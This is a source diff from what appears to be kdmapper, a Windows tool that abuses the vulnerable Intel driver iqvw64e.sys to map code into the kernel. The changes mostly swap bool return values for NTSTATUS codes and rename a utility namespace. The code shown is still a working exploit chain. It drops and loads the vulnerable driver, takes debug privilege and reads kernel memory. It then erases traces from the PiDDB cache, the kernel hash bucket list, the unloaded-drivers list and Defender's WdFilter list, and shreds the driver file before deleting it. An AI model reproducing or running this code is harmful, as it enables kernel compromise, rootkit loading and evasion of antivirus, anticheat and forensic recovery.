@@ -85,7 +85,7 @@ std::wstring intel_driver::GetDriverNameW() {
 }
 
 std::wstring intel_driver::GetDriverPath() {
-	std::wstring temp = utils::GetFullTempPath();
+	std::wstring temp = kdmUtils::GetFullTempPath();
 	if (temp.empty()) {
 		return L"";
 	}
@@ -103,11 +103,11 @@ bool intel_driver::IsRunning() {
 }
 
 //get Se debug privilege
-bool intel_driver::AcquireDebugPrivilege() {
+NTSTATUS intel_driver::AcquireDebugPrivilege() {
 
 	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
 	if (ntdll == NULL) {
-		return false;
+		return STATUS_UNSUCCESSFUL;
 	}
 
 	ULONG SE_DEBUG_PRIVILEGE = 20UL;
@@ -115,20 +115,19 @@ bool intel_driver::AcquireDebugPrivilege() {
 	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
 	if (!NT_SUCCESS(Status)) {
 		Log::Error("Failed to acquire SE_DEBUG_PRIVILEGE", false);
-		return false;
 	}
 
-	return true;
+	return Status;
 }
 
-bool intel_driver::Load() {
+NTSTATUS intel_driver::Load() {
 	srand((unsigned)time(NULL) * GetCurrentThreadId());
 
 	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
 	if (intel_driver::IsRunning())
 	{
 		Log::Error("\\Device\\Nal is already in use.>>>\nThis means that there is a intel driver already loaded or another instance of kdmapper is running or kdmapper crashed and didn't unload the previous driver.>>>\nIf you are sure that there is no other instance of kdmapper running, you can try to restart your computer to fix this issue.>>>\nIf the problem persists, you can try to unload the intel driver manually (If the driver was loaded with kdmapper will have a random name and will be located in %temp%), if not, the driver name is iqvw64e.sys.", false);
-		return false;
+		return STATUS_ALREADY_REGISTERED;
 	}
 
 	Log::Info("Loading intel driver");
@@ -137,26 +136,28 @@ bool intel_driver::Load() {
 	if (driver_path.empty())
 	{
 		Log::Error("Can't find TEMP folder", false);
-		return false;
+		return STATUS_UNSUCCESSFUL;
 	}
 
 	_wremove(driver_path.c_str());
 
-	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
+	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
 		Log::Error("Failed to create vulnerable driver file", false);
-		return false;
+		return STATUS_DISK_OPERATION_FAILED;
 	}
 
-	if (!AcquireDebugPrivilege()) {
+	auto status = AcquireDebugPrivilege();
+	if (!NT_SUCCESS(status)) {
 		Log::Error("Failed to acquire SeDebugPrivilege", false);
 		_wremove(driver_path.c_str());
-		return false;
+		return status;
 	}
 
-	if (!service::RegisterAndStart(driver_path, GetDriverNameW())) {
+	status = service::RegisterAndStart(driver_path, GetDriverNameW());
+	if (!NT_SUCCESS(status)) {
 		Log::Error("Failed to register and start service for the vulnerable driver", false);
 		_wremove(driver_path.c_str());
-		return false;
+		return status;
 	}
 
 	hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -165,15 +166,15 @@ bool intel_driver::Load() {
 	{
 		Log::Error("Failed to load driver iqvw64e.sys", false);
 		intel_driver::Unload();
-		return false;
+		return STATUS_NOT_FOUND;
 	}
 
-	ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
+	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress("ntoskrnl.exe");
 	if (ntoskrnlAddr == 0)
 	{
 		Log::Error("Failed to get ntoskrnl.exe", false);
 		intel_driver::Unload();
-		return false;
+		return STATUS_BAD_DLL_ENTRYPOINT;
 	}
 
 	//check MZ ntoskrnl.exe
@@ -181,39 +182,39 @@ bool intel_driver::Load() {
 	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
 		Log::Error("Can't exploit intel driver, is there any antivirus or anticheat running?", false);
 		intel_driver::Unload();
-		return false;
+		return STATUS_INVALID_IMAGE_FORMAT;
 	}
 
 	if (!intel_driver::ClearPiDDBCacheTable()) {
 		Log::Error("Failed to ClearPiDDBCacheTable", false);
 		intel_driver::Unload();
-		return false;
+		return STATUS_DELETE_PENDING | 0x1000;
 	}
 
 	if (!intel_driver::ClearKernelHashBucketList()) {
 		Log::Error("Failed to ClearKernelHashBucketList", false);
 		intel_driver::Unload();
-		return false;
+		return STATUS_DELETE_PENDING | 0x2000;
 	}
 
 	if (!intel_driver::ClearMmUnloadedDrivers()) {
 		Log::Warning("Failed to ClearMmUnloadedDrivers");
 		intel_driver::Unload();
-		return false;
+		return STATUS_DELETE_PENDING | 0x3000;
 	}
 
 	if (!intel_driver::ClearWdFilterDriverList()) {
 		Log::Warning("Failed to ClearWdFilterDriverList");
 		intel_driver::Unload();
-		return false;
+		return STATUS_DELETE_PENDING | 0x4000;
 	}
 
-	return true;
+	return STATUS_SUCCESS;
 }
 
 bool intel_driver::ClearWdFilterDriverList() {
 	std::ostringstream ss;
-	auto WdFilter = utils::GetKernelModuleAddress("WdFilter.sys");
+	auto WdFilter = kdmUtils::GetKernelModuleAddress("WdFilter.sys");
 	if (!WdFilter) {
 		Log::Fine("WdFilter.sys not loaded, clear skipped");
 		return true;
@@ -342,19 +343,24 @@ bool intel_driver::ClearWdFilterDriverList() {
 }
 
 
-bool intel_driver::Unload() {
+NTSTATUS intel_driver::Unload() {
 	Log::Info("Unloading vulnerable driver");
 
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
 		CloseHandle(hDevice);
 
-	if (!service::StopAndRemove(GetDriverNameW()))
-		return false;
+	auto status = service::StopAndRemove(GetDriverNameW());
+	if (!NT_SUCCESS(status))
+		return status;
 
 	std::wstring driver_path = GetDriverPath();
 
 	//Destroy disk information before unlink from disk to prevent any recover of the file
 	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
+	if (!file_ofstream.is_open()) {
+		Log::Error("Error opening driver file to dump random data inside the disk", false);
+		return STATUS_DELETE_PENDING;
+	}
 	int newFileLen = sizeof(intel_driver_resource::driver) + (((long long)rand()*(long long)rand()) % 2000000 + 1000);
 	BYTE* randomData = new BYTE[newFileLen];
 	for (size_t i = 0; i < newFileLen; i++) {
@@ -371,9 +377,9 @@ bool intel_driver::Unload() {
 
 	//unlink the file
 	if (_wremove(driver_path.c_str()) != 0)
-		return false;
+		return STATUS_DELETE_PENDING;
 
-	return true;
+	return STATUS_SUCCESS;
 }
 
 bool intel_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
@@ -1013,7 +1019,7 @@ uintptr_t intel_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen
 		return 0;
 	}
 
-	auto result = utils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
+	auto result = kdmUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
 
 	if (result <= 0) {
 		return 0;
@@ -1032,7 +1038,7 @@ uintptr_t intel_driver::FindSectionAtKernel(const char* sectionName, uintptr_t m
 		return 0;
 	}
 	ULONG sectionSize = 0;
-	uintptr_t section = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
+	uintptr_t section = (uintptr_t)kdmUtils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
 	if (!section || !sectionSize) {
 		Log::Error("Can't find section", false);
 		return 0;
@@ -1050,7 +1056,7 @@ uintptr_t intel_driver::FindPatternInSectionAtKernel(const char* sectionName, ui
 
 bool intel_driver::ClearKernelHashBucketList() {
 	std::ostringstream ss;
-	uint64_t ci = utils::GetKernelModuleAddress("ci.dll");
+	uint64_t ci = kdmUtils::GetKernelModuleAddress("ci.dll");
 	if (!ci) {
 		Log::Error("Can't Find ci.dll module address", false);
 		return false;
